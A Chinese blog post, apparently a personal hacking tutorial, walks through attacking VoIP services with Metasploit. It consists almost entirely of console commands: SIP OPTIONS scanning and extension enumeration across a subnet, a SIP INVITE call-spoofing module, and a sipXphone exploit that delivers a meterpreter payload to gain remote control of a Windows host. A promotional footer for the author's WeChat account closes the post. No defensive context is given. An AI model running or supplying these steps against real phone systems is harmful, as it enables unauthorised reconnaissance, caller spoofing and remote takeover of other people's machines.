---
layout: post
category: binghe-code-hack
title: Metasploit渗透VOIP
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: Metasploit渗透VOIP
lock: need
---

# Metasploit渗透VOIP

## 对VOIP服务踩点 

```
use auxiliary/scanner/sip/options
show options
set RHOSTS 192.168.109.0/24
run
```

## 扫描VOIP服务

```
use auxiliary/scanner/sip/enumerator
show options
set MINEXT 3000
set MAXEXT 3005
set PADLEN 4
set RHOSTS 192.168.109.0/24
run
```

## 欺骗VOIP电话

```
use auxiliary/voip/sip_invite_spoof
set RHOSTS 192.168.109.141
set EXTENSION 4444
show options
run
```

## 渗透VOIP

```
use exploit/windows/sip/sipxphone_cseq
set RHOST 192.168.109.141
set payload windows/meterpreter/bind_tcp
set LHOST 192.168.109.137
show options
exploit
```


## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)